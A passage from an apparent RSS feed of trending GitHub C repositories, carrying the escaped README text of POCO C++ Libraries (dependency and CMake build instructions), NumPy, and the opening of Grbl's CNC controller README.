&lt;li&gt;Open Source, licensed under the &lt;a href="https://spdx.org/licenses/BSL-1.0" rel="nofollow"&gt;Boost Software License&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="doc/images/overview.png"&gt;&lt;img src="doc/images/overview.png" alt="alt text" title="Poco Overview" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To start using POCO, see the &lt;a href="https://pocoproject.org/docs/00100-GuidedTour.html" rel="nofollow"&gt;Guided Tour&lt;/a&gt;
and &lt;a href="https://pocoproject.org/docs/00200-GettingStarted.html" rel="nofollow"&gt;Getting Started&lt;/a&gt; documents.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-quick-start-with-cmake" class="anchor" aria-hidden="true" href="#quick-start-with-cmake"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Quick Start (with CMake)&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-prerequisites" class="anchor" aria-hidden="true" href="#prerequisites"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Prerequisites&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CMake 3.5 or newer&lt;/li&gt;
&lt;li&gt;A C++14 compiler (Visual C++ 2015, GCC 5.0, Clang 3.4, or newer)&lt;/li&gt;
&lt;li&gt;OpenSSL headers and libraries (optional, but recommended)&lt;/li&gt;
&lt;li&gt;MySQL, PostgreSQL and ODBC client libraries (optional)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most Unix/Linux systems already have OpenSSL preinstalled. If your system
does not have OpenSSL, please get it from &lt;a href="http://www.openssl.org" rel="nofollow"&gt;http://www.openssl.org&lt;/a&gt; or
another source. You do not have to build OpenSSL yourself - a binary
distribution is fine. For example, via Debian APT:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ apt-get install openssl libssl-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;On macOS, the easiest way to install OpenSSL is via &lt;a href="https://brew.sh" rel="nofollow"&gt;Homebrew&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ brew install openssl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The easiest way to install OpenSSL on Windows is to use a binary
(prebuild) release, for example the one from Shining Light
Productions that comes with a
&lt;a href="https://www.slproweb.com/products/Win32OpenSSL.html" rel="nofollow"&gt;Windows installer&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;On Windows, POCO can also use the native Windows TLS APIs (SChannel).&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-installing-all-dependencies-linux-and-macos" class="anchor" aria-hidden="true" href="#installing-all-dependencies-linux-and-macos"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing All Dependencies (Linux and macOS)&lt;/h3&gt;
&lt;p&gt;All dependencies can be installed with the following commands:&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-debian-linux-including-ubuntu-and-raspbian" class="anchor" aria-hidden="true" href="#debian-linux-including-ubuntu-and-raspbian"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Debian Linux (including Ubuntu and Raspbian)&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt-get -y update &amp;amp;&amp;amp; sudo apt-get -y install git g++ make cmake libssl-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-redhat-linux" class="anchor" aria-hidden="true" href="#redhat-linux"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;RedHat Linux&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$ sudo yum install -y git gcc-c++ make cmake3 openssl-devel
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-macos-with-homebrew" class="anchor" aria-hidden="true" href="#macos-with-homebrew"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;macOS (with Homebrew)&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$ brew install cmake openssl
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a id="user-content-building-with-cmake-linux-macos-windows" class="anchor" aria-hidden="true" href="#building-with-cmake-linux-macos-windows"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building with CMake (Linux, macOS, Windows)&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://cmake.org" rel="nofollow"&gt;CMake&lt;/a&gt; (version 3.5 or newer) is the recommended build system for
building the POCO C++ Libraries.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ git clone -b master https://github.com/pocoproject/poco.git
$ cd poco
$ mkdir cmake-build
$ cd cmake-build
$ cmake ..
$ cmake --build . --config Release
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;On macOS, it's necessary to tell CMake where to find the OpenSSL headers
and libraries by setting the &lt;code&gt;OPENSSL_ROOT_DIR&lt;/code&gt; CMake variable.
For example, if OpenSSL has been installed with Homebrew,
the &lt;code&gt;cmake&lt;/code&gt; invocation becomes:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Other common ways of building with CMake (e.g., &lt;code&gt;cmake-gui&lt;/code&gt;) will also work.&lt;/p&gt;
&lt;p&gt;There are also a number of project-specific CMake variables that can be changed.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-cross-compiling" class="anchor" aria-hidden="true" href="#cross-compiling"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cross-Compiling&lt;/h4&gt;
&lt;p&gt;With a proper CMake toolchain file (specified via the &lt;code&gt;CMAKE_TOOLCHAIN_FILE&lt;/code&gt; CMake variable),
the POCO C++ Libraries can be cross-compiled for embedded Linux systems:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cmake .. -DCMAKE_TOOLCHAIN_FILE=/path/to/mytoolchain.cmake -DCMAKE_INSTALL_PREFIX=/path/to/target
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-installing" class="anchor" aria-hidden="true" href="#installing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing&lt;/h4&gt;
&lt;p&gt;The POCO C++ Libraries headers and libraries can be optionally be installed by building the &lt;code&gt;install&lt;/code&gt; target.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo cmake --build . --target install
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The default install location is &lt;code&gt;/usr/local/&lt;/code&gt; on Linux and macOS and
&lt;code&gt;C:\Program Files (x64)\&lt;/code&gt; on Windows and can be overridden by setting
the &lt;code&gt;CMAKE_INSTALL_PREFIX&lt;/code&gt; CMake variable.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-building-without-cmake" class="anchor" aria-hidden="true" href="#building-without-cmake"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building Without CMake&lt;/h3&gt;
&lt;p&gt;If you do not want to or cannot use CMake, POCO can also be built with Visual Studio
(project and solution files included) or GNU Make (Linux, macOS and other supported Unix platforms).&lt;/p&gt;
&lt;p&gt;Please refer to the &lt;a href="https://pocoproject.org/docs" rel="nofollow"&gt;documentation&lt;/a&gt; for more information.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-getting-poco-via-a-package-manager" class="anchor" aria-hidden="true" href="#getting-poco-via-a-package-manager"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Getting POCO via a Package Manager&lt;/h3&gt;
&lt;p&gt;POCO can also be obtained via different &lt;a href="https://pocoproject.org/download.html" rel="nofollow"&gt;package managers&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-community-and-contributing" class="anchor" aria-hidden="true" href="#community-and-contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Community and Contributing&lt;/h2&gt;
&lt;p&gt;POCO has an active user and contributing community, please visit our &lt;a href="https://pocoproject.org" rel="nofollow"&gt;website&lt;/a&gt; and &lt;a href="https://pocoproject.org/blog" rel="nofollow"&gt;blog&lt;/a&gt;.
Answers to POCO-related questions can also be found on &lt;a href="https://stackoverflow.com/questions/tagged/poco-libraries" rel="nofollow"&gt;Stack Overflow&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Please see &lt;a href="CONTRIBUTING.md"&gt;CONTRIBUTING&lt;/a&gt; for submitting contributions, bugs reports, feature requests or security issues.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-poco-vs-boost" class="anchor" aria-hidden="true" href="#poco-vs-boost"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;POCO vs. Boost&lt;/h3&gt;
&lt;p&gt;In regards to Boost, in spite of some functional overlapping,
POCO is best thought of as a Boost complement (rather than replacement).
Side-by-side use of Boost and POCO is a very common occurrence.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>pocoproject</author><guid isPermaLink="false">https://github.com/pocoproject/poco</guid><pubDate>Tue, 04 Feb 2020 00:11:00 GMT</pubDate></item><item><title>numpy/numpy #12 in C, This week</title><link>https://github.com/numpy/numpy</link><description>&lt;p&gt;&lt;i&gt;The fundamental package for scientific computing with Python.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="" class="anchor" aria-hidden="true" href="#"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/b3ffb735f64eea19dd6790720c0d7e8db71931aa/68747470733a2f2f63646e2e7261776769742e636f6d2f6e756d70792f6e756d70792f6d61737465722f6272616e64696e672f69636f6e732f6e756d70796c6f676f2e737667"&gt;&lt;img alt="NumPy" src="https://camo.githubusercontent.com/b3ffb735f64eea19dd6790720c0d7e8db71931aa/68747470733a2f2f63646e2e7261776769742e636f6d2f6e756d70792f6e756d70792f6d61737465722f6272616e64696e672f69636f6e732f6e756d70796c6f676f2e737667" height="60" data-canonical-src="https://cdn.rawgit.com/numpy/numpy/master/branding/icons/numpylogo.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://travis-ci.org/numpy/numpy" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/ca39db826536431887a9f9769f0c4916fb5bc9d9/68747470733a2f2f696d672e736869656c64732e696f2f7472617669732f6e756d70792f6e756d70792f6d61737465722e7376673f6c6162656c3d5472617669732532304349" alt="Travis" data-canonical-src="https://img.shields.io/travis/numpy/numpy/master.svg?label=Travis%20CI" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://dev.azure.com/numpy/numpy/_build/latest?definitionId=5" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c48d2f1af5aca3fdae78efc7802a5af487a4c6b6/68747470733a2f2f6465762e617a7572652e636f6d2f6e756d70792f6e756d70792f5f617069732f6275696c642f7374617475732f617a7572652d706970656c696e652532306e756d70792e6e756d7079" alt="Azure" data-canonical-src="https://dev.azure.com/numpy/numpy/_apis/build/status/azure-pipeline%20numpy.numpy" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://codecov.io/gh/numpy/numpy" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/ee31151785b4dbf0e011188f9a28267a4c4443bf/68747470733a2f2f636f6465636f762e696f2f67682f6e756d70792f6e756d70792f6272616e63682f6d61737465722f67726170682f62616467652e737667" alt="codecov" data-canonical-src="https://codecov.io/gh/numpy/numpy/branch/master/graph/badge.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;NumPy is the fundamental package needed for scientific computing with Python.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Website:&lt;/strong&gt; &lt;a href="https://www.numpy.org" rel="nofollow"&gt;https://www.numpy.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Documentation:&lt;/strong&gt; &lt;a href="https://docs.scipy.org/" rel="nofollow"&gt;https://docs.scipy.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Mailing list:&lt;/strong&gt; &lt;a href="https://mail.python.org/mailman/listinfo/numpy-discussion" rel="nofollow"&gt;https://mail.python.org/mailman/listinfo/numpy-discussion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Source code:&lt;/strong&gt; &lt;a href="https://github.com/numpy/numpy"&gt;https://github.com/numpy/numpy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Contributing:&lt;/strong&gt; &lt;a href="https://www.numpy.org/devdocs/dev/index.html" rel="nofollow"&gt;https://www.numpy.org/devdocs/dev/index.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bug reports:&lt;/strong&gt; &lt;a href="https://github.com/numpy/numpy/issues"&gt;https://github.com/numpy/numpy/issues&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Report a security vulnerability:&lt;/strong&gt; &lt;a href="https://tidelift.com/docs/security" rel="nofollow"&gt;https://tidelift.com/docs/security&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It provides:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a powerful N-dimensional array object&lt;/li&gt;
&lt;li&gt;sophisticated (broadcasting) functions&lt;/li&gt;
&lt;li&gt;tools for integrating C/C++ and Fortran code&lt;/li&gt;
&lt;li&gt;useful linear algebra, Fourier transform, and random number capabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Testing:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NumPy versions ≥ 1.15 require &lt;code&gt;pytest&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;NumPy versions &amp;lt; 1.15 require &lt;code&gt;nose&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tests can then be run after installation with:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python -c 'import numpy; numpy.test()'
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a id="user-content-call-for-contributions" class="anchor" aria-hidden="true" href="#call-for-contributions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Call for Contributions&lt;/h2&gt;
&lt;p&gt;NumPy appreciates help from a wide range of different backgrounds.
Work such as high level documentation or website improvements are valuable
and we would like to grow our team with people filling these roles.
Small improvements or fixes are always appreciated and issues labeled as easy
may be a good starting point.
If you are considering larger contributions outside the traditional coding work,
please contact us through the mailing list.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://numfocus.org" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/a8484140207659af672a0a1784c5b9277647bb79/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f706f776572656425323062792d4e756d464f4355532d6f72616e67652e7376673f7374796c653d666c617426636f6c6f72413d45313532334426636f6c6f72423d303037443841" alt="Powered by NumFOCUS" data-canonical-src="https://img.shields.io/badge/powered%20by-NumFOCUS-orange.svg?style=flat&amp;amp;colorA=E1523D&amp;amp;colorB=007D8A" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>numpy</author><guid isPermaLink="false">https://github.com/numpy/numpy</guid><pubDate>Tue, 04 Feb 2020 00:12:00 GMT</pubDate></item><item><title>gnea/grbl #13 in C, This week</title><link>https://github.com/gnea/grbl</link><description>&lt;p&gt;&lt;i&gt;An open source, embedded, high performance g-code-parser and CNC milling controller written in optimized C that will run on a straight Arduino&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://github.com/gnea/gnea-Media/blob/master/Grbl%20Logo/Grbl%20Logo%20250px.png?raw=true"&gt;&lt;img src="https://github.com/gnea/gnea-Media/raw/master/Grbl%20Logo/Grbl%20Logo%20250px.png?raw=true" alt="GitHub Logo" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;Click the &lt;code&gt;Release&lt;/code&gt; tab to download pre-compiled &lt;code&gt;.hex&lt;/code&gt; files or just &lt;a href="https://github.com/gnea/grbl/releases"&gt;click here&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Grbl is a no-compromise, high performance, low cost alternative to parallel-port-based motion control for CNC milling. This version of Grbl runs on an Arduino with a 328p processor (Uno, Duemilanove, Nano, Micro, etc).&lt;/p&gt;
&lt;p&gt;The controller is written in highly optimized C utilizing every clever feature of the AVR-chips to achieve precise timing and asynchronous operation. It is able to maintain up to 30kHz of stable, jitter free control pulses.&lt;/p&gt;
&lt;p&gt;It accepts standards-compliant g-code and has been tested with the output of several CAM tools with no problems. Arcs, circles and helical motion are fully supported, as well as, all other primary g-code commands. Macro functions, variables, and most canned cycles are not supported, but we think GUIs can do a much better job at translating them into straight g-code anyhow.&lt;/p&gt;
&lt;p&gt;Grbl includes full acceleration management with look ahead. That means the controller will look up to 16 motions into the future and plan its velocities ahead to deliver smooth acceleration and jerk-free cornering.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/gnea/grbl/wiki/Licensing"&gt;Licensing&lt;/a&gt;: Grbl is free software, released under the GPLv3 license.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For more information and help, check out our &lt;strong&gt;&lt;a href="https://github.com/gnea/grbl/wiki"&gt;Wiki pages!&lt;/a&gt;&lt;/strong&gt; If you find that the information is out-dated, please to help us keep it updated by editing it or notifying our community! Thanks!&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Lead Developer: Sungeun "Sonny" Jeon, Ph.D. (USA) aka @chamnit&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Built on the wonderful Grbl v0.6 (2011) firmware written by Simen Svale Skogsrud (Norway).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
